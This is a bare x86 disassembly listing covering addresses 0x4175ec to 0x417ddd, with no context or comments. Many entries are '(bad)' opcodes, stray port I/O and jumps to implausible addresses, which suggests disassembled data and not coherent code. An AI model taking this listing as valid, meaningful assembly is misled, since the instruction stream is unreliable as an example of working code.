  4175ec:	push   esi
  4175ed:	ins    DWORD PTR es:[edi],dx
  4175ee:	xchg   esp,eax
  4175ef:	loop   0x4175b3
  4175f1:	push   ecx
  4175f2:	sahf   
  4175f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175f4:	xchg   ebp,eax
  4175f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175f7:	sbb    dl,BYTE PTR [edx]
  4175f9:	aam    0x84
  4175fb:	hlt    
  4175fc:	outs   dx,DWORD PTR ds:[esi]
  4175fd:	(bad)  
  4175fe:	adc    edx,ebp
  417600:	daa    
  417601:	(bad)  
  417602:	mov    dh,0xe4
  417604:	add    BYTE PTR [edx],bl
  417606:	sahf   
  417607:	lds    eax,FWORD PTR [edx-0x10]
  41760a:	mov    al,0x76
  41760c:	scas   eax,DWORD PTR es:[edi]
  41760d:	sbb    eax,0xed4360ec
  417612:	mov    al,0x69
  417614:	dec    ebp
  417615:	mov    dl,0x68
  417617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417618:	pop    esi
  417619:	mov    ecx,0xb55f2bbc
  41761e:	dec    esi
  41761f:	mov    ds,WORD PTR [esi*1+0x4c9086c7]
  417626:	pop    ds
  417627:	repnz cmp dl,BYTE PTR [esi]
  41762a:	mov    ah,0x1
  41762c:	add    al,0xd1
  41762e:	and    esp,DWORD PTR [edx-0x7]
  417631:	jnp    0x4175ff
  417633:	arpl   WORD PTR [ebx+0x7f79ccbb],si
  417639:	gs or  esp,edi
  41763c:	push   ss
  41763d:	inc    edi
  41763e:	pop    ds
  41763f:	fcom   DWORD PTR ds:0x5154e3f
  417645:	xchg   DWORD PTR [edi-0x17],edx
  417648:	stos   BYTE PTR es:[edi],al
  417649:	aaa    
  41764a:	xchg   ebp,eax
  41764b:	add    al,0x69
  41764d:	add    BYTE PTR [edx+0x52f083bc],dl
  417653:	sbb    eax,0xe55d715b
  417658:	ror    bl,1
  41765a:	push   edx
  41765b:	cmp    eax,0xfd731ad4
  417660:	adc    al,0x72
  417662:	xchg   esi,eax
  417663:	in     al,dx
  417664:	pushf  
  417665:	or     DWORD PTR [ebx],edx
  417667:	ds jle 0x417664
  41766a:	dec    ebx
  41766b:	(bad)  
  41766c:	adc    edx,DWORD PTR [eax]
  41766e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41766f:	fs push edi
  417671:	(bad)  
  417672:	push   esp
  417673:	out    dx,al
  417674:	add    DWORD PTR [edx-0x50],esi
  417677:	rcl    DWORD PTR [ebx-0x7f],1
  41767a:	jno    0x41764c
  41767c:	leave  
  41767d:	fcom   DWORD PTR [ebp-0x6ee71edd]
  417683:	fmul   st,st(4)
  417685:	xor    BYTE PTR [ebx-0x19],dh
  417688:	mov    ds:0xe3648226,eax
  41768d:	mov    bl,0x38
  41768f:	mov    al,ds:0xb9d9e627
  417694:	push   esi
  417695:	push   cs
  417696:	lods   al,BYTE PTR ds:[esi]
  417697:	call   0x1496e5bc
  41769c:	mov    eax,ds:0x3cc72bde
  4176a1:	or     eax,0xec8d5730
  4176a6:	stos   BYTE PTR es:[edi],al
  4176a7:	mov    ebp,0xe3245295
  4176ac:	dec    esp
  4176ad:	inc    ecx
  4176ae:	xor    esi,esi
  4176b0:	sbb    al,0xe3
  4176b2:	push   ecx
  4176b3:	fstp   QWORD PTR [edx-0x53f94fd4]
  4176b9:	test   al,0x4
  4176bb:	xor    al,0xa9
  4176bd:	out    dx,eax
  4176be:	adc    eax,0xd0a8317f
  4176c3:	xchg   ebx,eax
  4176c4:	add    edx,esp
  4176c6:	ds jmp 0x3581a221
  4176cc:	hlt    
  4176cd:	comiss xmm4,DWORD PTR [eax]
  4176d0:	outs   dx,BYTE PTR ds:[esi]
  4176d1:	sub    DWORD PTR [ecx-0x19db5e1f],esi
  4176d7:	mov    ebx,0xf9a927b5
  4176dc:	mov    es,ebp
  4176de:	push   ecx
  4176df:	and    BYTE PTR [edi-0x1bf08f0],0x19
  4176e6:	ret    0x833c
  4176e9:	dec    ecx
  4176ea:	xlat   BYTE PTR ds:[ebx]
  4176eb:	leave  
  4176ec:	inc    eax
  4176ed:	push   DWORD PTR [edx-0x697959b9]
  4176f3:	xchg   ebp,eax
  4176f4:	add    eax,0x4f910332
  4176f9:	loop   0x417713
  4176fb:	cli    
  4176fc:	adc    eax,0xc089391c
  417701:	add    al,0x5e
  417703:	mov    esp,0xff43dc98
  417708:	mov    ah,0xcc
  41770a:	mov    al,0x72
  41770c:	xchg   ebp,eax
  41770d:	push   0xffffffbe
  41770f:	mov    ah,0x26
  417711:	jo     0x41774a
  417713:	iret   
  417714:	ja     0x4176c3
  417716:	pop    ds
  417717:	dec    ecx
  417718:	jnp    0x417795
  41771a:	jbe    0x4176ba
  41771c:	int    0xce
  41771e:	inc    ecx
  41771f:	outs   dx,BYTE PTR ds:[esi]
  417720:	cmp    dl,bh
  417722:	mov    bl,0xd5
  417724:	xchg   esp,eax
  417725:	sub    eax,0x5f6eae97
  41772a:	mov    al,ds:0x67e04bf7
  41772f:	pop    esi
  417730:	pusha  
  417731:	mov    eax,0xf8c4aa26
  417736:	xor    eax,0xb33cb0dd
  41773b:	ins    BYTE PTR es:[edi],dx
  41773c:	xchg   esp,eax
  41773d:	iret   
  41773e:	shl    BYTE PTR [eax-0x49afc8c9],0x2a
  417745:	cwde   
  417746:	jnp    0x41779b
  417748:	dec    ebp
  417749:	xor    eax,0x2aaec198
  41774e:	mov    esp,0xb2d881f5
  417753:	outs   dx,BYTE PTR ds:[esi]
  417754:	fdivr  QWORD PTR [edi-0x2b]
  417757:	adc    BYTE PTR [ebp-0x7f3477f1],bh
  41775d:	dec    ebx
  41775e:	aas    
  41775f:	sbb    BYTE PTR [ebx+eax*4],cl
  417762:	or     DWORD PTR [esi+0x407d3569],0xe3c3b81c
  41776c:	xor    DWORD PTR ds:0x3969d0e0,0x79
  417773:	jg     0x4177dc
  417775:	(bad)  
  417776:	cli    
  417777:	je     0x417755
  417779:	and    al,0xe1
  41777b:	bnd jb 0x417774
  41777e:	fisubr WORD PTR [ebx]
  417780:	fcomp  DWORD PTR [edx-0x3f6b42cb]
  417786:	adc    al,0xe2
  417788:	push   eax
  417789:	inc    eax
  41778a:	mov    ch,0x8f
  41778c:	push   0xbeaaf790
  417791:	aas    
  417792:	mov    al,ds:0x6bcb62a9
  417797:	ins    BYTE PTR es:[edi],dx
  417798:	cmp    eax,0x73498f03
  41779d:	in     eax,0x9d
  41779f:	into   
  4177a0:	aam    0xec
  4177a2:	or     eax,0x9baa2dcf
  4177a7:	cmp    BYTE PTR [ebp+ecx*4-0x3a],dh
  4177ab:	inc    ebp
  4177ac:	xchg   BYTE PTR [ecx-0x68],bl
  4177af:	add    BYTE PTR [ecx],bl
  4177b1:	xchg   ebp,eax
  4177b2:	dec    ebx
  4177b3:	and    bl,al
  4177b5:	add    al,0xa6
  4177b7:	jns    0x4177a7
  4177b9:	adc    al,0x6f
  4177bb:	cli    
  4177bc:	mov    esp,0xbbfa31af
  4177c1:	dec    ecx
  4177c2:	and    esi,DWORD PTR [edi-0x4d358fae]
  4177c8:	dec    esi
  4177c9:	sti    
  4177ca:	in     eax,0x1e
  4177cc:	pusha  
  4177cd:	add    dh,BYTE PTR [ebx-0x788adfec]
  4177d3:	cmp    bl,al
  4177d5:	mov    ds:0xb2dc50a5,eax
  4177da:	mov    ch,0xab
  4177dc:	inc    esp
  4177dd:	ror    BYTE PTR [ebx+eax*1-0x3a4649ea],1
  4177e4:	rol    BYTE PTR [eax-0x6f826e72],cl
  4177ea:	inc    esp
  4177eb:	and    cl,BYTE PTR [esi+0x36c2454e]
  4177f1:	add    eax,0x64fef2f5
  4177f6:	and    eax,0xdc577a45
  4177fb:	into   
  4177fc:	scas   eax,DWORD PTR es:[edi]
  4177fd:	pushf  
  4177fe:	add    eax,ecx
  417800:	inc    edi
  417801:	jo     0x417790
  417803:	or     al,0x4e
  417805:	in     al,dx
  417806:	inc    esp
  417807:	mov    bh,0xc3
  417809:	mov    eax,ds:0xb4b92c70
  41780e:	fwait
  41780f:	inc    esi
  417810:	imul   ebx,DWORD PTR ds:0x5ef1627b,0x5b
  417817:	leave  
  417818:	ret    0x10
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
